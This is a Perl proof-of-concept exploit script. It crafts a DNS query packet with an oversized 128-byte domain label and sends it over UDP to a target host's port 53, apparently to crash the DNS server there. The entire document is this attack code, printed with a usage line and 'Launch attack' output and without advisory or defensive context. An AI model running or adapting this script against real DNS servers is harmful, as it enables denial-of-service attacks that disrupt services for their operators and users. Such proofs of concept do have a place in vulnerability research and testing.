Proof Of Concept :
-----------------------------------------------------------
#!/usr/bin/perl
use IO::Socket;
use Socket;
use Math::BigInt;
$|=1;
$host=shift;
$port=shift || '53';
die "usage: $0 \$host [\$port]\n" if(!defined($host));
$target_ip = inet_aton($host);
$target = sockaddr_in($port, $target_ip);
$crash='A'x128;
$transaction_id_count=1;
sub dns_struct_pack($){
        $domain=shift;                  #domain
        $type="\x00\xff";               #dns_type = ANY
        $transaction_id_count=1 if($transaction_id_count > 255);
        $x=Math::BigInt->new($transaction_id_count);
        $x=~s/0x//;
        $transaction_id=sprintf("\x00".chr($x));
        $flag="\x01\x00";
        $question="\x00\x01";
        $answer_rrs="\x00\x00";
        $authority_rrs="\x00\x00";
        $additional_rrs="\x00\x00";
        if($domain ne '0'){
                undef($domain_length);
                $domain_length=length($domain);
                $y=Math::BigInt->new($domain_length);
                $y=~s/0x//;
                $domain_length=chr($y);
        }
        $class="\x00\x01";                    #IN
        $transaction_id_count++;
        if($domain eq '0'){
$packet_struct="$transaction_id"."$flag"."$question"."$answer_rrs"."$authority_rrs"."$additional_rrs"."\x00"."$type"."$class";
        }else{
         $packet_struct="$transaction_id"."$flag"."$question"."$answer_rrs"."$authority_rrs"."$additional_rrs"."$domain_length"."$domain".
                "\x00"."$type"."$class";
        }
        return $packet_struct;
}
print "Launch attack ... ";
socket(SOCK1, AF_INET, SOCK_DGRAM, 17);
send(SOCK1, &dns_struct_pack($crash), 0, $target);
close(SOCK1);
print "Finish!\n";
exit(0);
-----------------------------------------------------------
